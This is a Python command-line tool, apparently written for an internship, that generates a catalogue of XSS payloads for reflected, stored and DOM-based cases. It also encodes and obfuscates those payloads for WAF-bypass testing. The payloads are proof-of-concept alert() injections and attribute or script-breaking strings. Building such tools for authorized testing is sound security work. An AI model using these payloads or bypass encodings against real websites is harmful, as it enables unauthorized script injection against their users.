#!/usr/bin/env python3
"""
XSS Payload Generator Module
ITSOLERA Internship Task - Offensive Security Tool Development
Educational Purpose Only - For Authorized Testing & Learning
"""

import argparse
import json
import base64
from urllib.parse import quote
from enum import Enum
from typing import Dict, List, Any

class ContextType(Enum):
    """XSS context types for payload generation"""
    HTML = "html"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"

class XSSPayloadGenerator:
    """Educational XSS payload template generator"""
    
    def __init__(self):
        self.payload_templates = {
            "reflected": self._get_reflected_payloads,
            "stored": self._get_stored_payloads,
            "dom": self._get_dom_payloads
        }
        
    def _get_reflected_payloads(self, context: ContextType) -> List[Dict]:
        """Generate reflected XSS payload templates"""
        base_payloads = {
            ContextType.HTML: [
                {
                    "payload": "<script>alert('XSS')</script>",
                    "description": "Basic script tag injection",
                    "bypass_techniques": ["encoding", "tag_switching"]
                },
                {
                    "payload": "<img src=x onerror=alert('XSS')>",
                    "description": "Image tag with onerror event",
                    "bypass_techniques": ["event_handlers", "tag_switching"]
                },
                {
                    "payload": "<svg onload=alert('XSS')>",
                    "description": "SVG tag with onload event",
                    "bypass_techniques": ["alternative_tags"]
                }
            ],
            ContextType.ATTRIBUTE: [
                {
                    "payload": "\" onmouseover=\"alert('XSS')\"",
                    "description": "Breaking attribute context",
                    "bypass_techniques": ["quote_breaking", "event_handlers"]
                },
                {
                    "payload": "javascript:alert('XSS')",
                    "description": "JavaScript pseudo-protocol in href/src",
                    "bypass_techniques": ["protocol_abuse"]
                }
            ],
            ContextType.JAVASCRIPT: [
                {
                    "payload": "';alert('XSS');//",
                    "description": "Breaking JavaScript string context",
                    "bypass_techniques": ["string_breaking", "comment_insertion"]
                },
                {
                    "payload": "</script><script>alert('XSS')</script>",
                    "description": "Closing script tag to inject new script",
                    "bypass_techniques": ["tag_closure"]
                }
            ]
        }
        return base_payloads.get(context, [])
    
    def _get_stored_payloads(self, context: ContextType) -> List[Dict]:
        """Generate stored XSS payload templates"""
        # Similar structure but designed for persistent storage scenarios
        base_payloads = self._get_reflected_payloads(context)
        for payload in base_payloads:
            payload["storage_medium"] = ["database", "file", "cache"]
            payload["trigger_condition"] = "data_retrieval"
        return base_payloads
    
    def _get_dom_payloads(self, context: ContextType) -> List[Dict]:
        """Generate DOM-based XSS payload templates"""
        dom_payloads = {
            ContextType.HTML: [
                {
                    "payload": "#<script>alert('XSS')</script>",
                    "description": "URL fragment injection",
                    "source": "window.location.hash",
                    "sink": "innerHTML"
                },
                {
                    "payload": "?param=<img src=x onerror=alert('XSS')>",
                    "description": "URL parameter injection",
                    "source": "document.URL",
                    "sink": "document.write"
                }
            ],
            ContextType.JAVASCRIPT: [
                {
                    "payload": "\\'-alert(1)//",
                    "description": "JavaScript execution via eval()",
                    "source": "location.search",
                    "sink": "eval()"
                }
            ]
        }
        return dom_payloads.get(context, [])
    
    def apply_encoding(self, payload: str, encoding_type: str) -> Dict:
        """Apply various encoding techniques for bypass demonstration"""
        encoded_versions = {
            "url": quote(payload),
            "url_double": quote(quote(payload)),
            "base64": base64.b64encode(payload.encode()).decode(),
            "hex": payload.encode().hex(),
            "html_entity": self._html_encode(payload),
            "unicode": self._unicode_encode(payload)
        }
        return {
            "original": payload,
            "encoded": encoded_versions.get(encoding_type, payload),
            "encoding_type": encoding_type,
            "description": f"{encoding_type.upper()} encoded version for WAF bypass testing"
        }
    
    def _html_encode(self, payload: str) -> str:
        """Convert payload to HTML entities"""
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    def _unicode_encode(self, payload: str) -> str:
        """Convert payload to Unicode escape sequences"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def apply_obfuscation(self, payload: str, technique: str) -> Dict:
        """Apply obfuscation techniques"""
        obfuscated = {
            "comment_insertion": payload.replace("<script", "<sc<!-->ript"),
            "whitespace_abuse": payload.replace("alert", "alert\t"),
            "case_manipulation": payload.replace("alert", "AlErT"),
            "mixed_encoding": self._mixed_encoding(payload)
        }
        return {
            "original": payload,
            "obfuscated": obfuscated.get(technique, payload),
            "technique": technique,
            "description": f"Bypass using {technique.replace('_', ' ')}"
        }
    
    def _mixed_encoding(self, payload: str) -> str:
        """Apply mixed encoding techniques"""
        result = ""
        for i, char in enumerate(payload):
            if i % 3 == 0:
                result += quote(char)
            elif i % 3 == 1:
                result += f'&#{ord(char)};'
            else:
                result += char
        return result
    
    def generate_payload_catalog(self, module_type: str = "all", output_format: str = "cli") -> Dict:
        """Generate complete payload catalog with all variations"""
        catalog = {
            "metadata": {
                "tool": "ITSOLERA XSS Educational Generator",
                "purpose": "Educational - Payload Templates for Learning",
                "ethical_use_only": True,
                "reference": "PortSwigger XSS Cheat Sheet"
            },
            "payloads": []
        }
        
        contexts = [ContextType.HTML, ContextType.ATTRIBUTE, ContextType.JAVASCRIPT]
        
        for context in contexts:
            if module_type == "all" or module_type == "reflected":
                for payload in self._get_reflected_payloads(context):
                    catalog["payloads"].append({
                        "type": "reflected",
                        "context": context.value,
                        **payload
                    })
            
            if module_type == "all" or module_type == "stored":
                for payload in self._get_stored_payloads(context):
                    catalog["payloads"].append({
                        "type": "stored",
                        "context": context.value,
                        **payload
                    })
            
            if module_type == "all" or module_type == "dom":
                for payload in self._get_dom_payloads(context):
                    catalog["payloads"].append({
                        "type": "dom",
                        "context": context.value,
                        **payload
                    })
        
        return catalog
    
    def export_payloads(self, catalog: Dict, format: str = "json") -> str:
        """Export payload catalog in various formats"""
        if format == "json":
            return json.dumps(catalog, indent=2)
        elif format == "txt":
            return self._format_as_txt(catalog)
        else:
            return str(catalog)
    
    def _format_as_txt(self, catalog: Dict) -> str:
        """Format catalog as readable text"""
        output = []
        output.append("=" * 60)
        output.append(f"ITSOLERA XSS EDUCATIONAL PAYLOAD CATALOG")
        output.append("=" * 60)
        output.append(f"Purpose: {catalog['metadata']['purpose']}")
        output.append(f"Ethical Use Only: {catalog['metadata']['ethical_use_only']}")
        output.append("=" * 60 + "\n")
        
        for payload in catalog["payloads"]:
            output.append(f"[{payload['type'].upper()}] Context: {payload['context']}")
            output.append(f"Payload: {payload['payload']}")
            output.append(f"Description: {payload['description']}")
            output.append(f"Bypass Techniques: {', '.join(payload.get('bypass_techniques', []))}")
            if 'source' in payload:
                output.append(f"DOM Source: {payload['source']}")
                output.append(f"DOM Sink: {payload['sink']}")
            output.append("-" * 40)
        
        return "\n".join(output)


def main():
    """CLI interface for XSS Payload Generator"""
    parser = argparse.ArgumentParser(
        description="ITSOLERA XSS Educational Payload Generator",
        epilog="For authorized testing and educational purposes only"
    )
    
    parser.add_argument("--module", choices=["xss"], default="xss",
                       help="Module to use (xss only for this version)")
    parser.add_argument("--type", choices=["reflected", "stored", "dom", "all"],
                       default="all", help="Type of XSS payloads")
    parser.add_argument("--context", choices=["html", "attribute", "javascript"],
                       default="html", help="Context for payload generation")
    parser.add_argument("--encode", choices=["url", "base64", "hex", "html_entity", "unicode"],
                       help="Apply encoding to payloads")
    parser.add_argument("--obfuscate", choices=["comment_insertion", "whitespace_abuse", 
                       "case_manipulation", "mixed_encoding"],
                       help="Apply obfuscation technique")
    parser.add_argument("--output", choices=["json", "txt"], default="json",
                       help="Output format")
    parser.add_argument("--export", type=str, help="Export to file")
    
    args = parser.parse_args()
    
    # Initialize generator
    generator = XSSPayloadGenerator()
    
    # Generate catalog
    catalog = generator.generate_payload_catalog(
        module_type=args.type if args.type != "all" else "all",
        output_format=args.output
    )
    
    # Apply encoding if requested
    if args.encode:
        for payload in catalog["payloads"]:
            encoded = generator.apply_encoding(payload["payload"], args.encode)
            payload["encoded_version"] = encoded
    
    # Apply obfuscation if requested
    if args.obfuscate:
        for payload in catalog["payloads"]:
            obfuscated = generator.apply_obfuscation(payload["payload"], args.obfuscate)
            payload["obfuscated_version"] = obfuscated
    
    # Output results
    output_data = generator.export_payloads(catalog, args.output)
    
    if args.export:
        with open(args.export, 'w') as f:
            f.write(output_data)
        print(f"[+] Payload catalog exported to {args.export}")
    else:
        print(output_data)

if __name__ == "__main__":
    main()
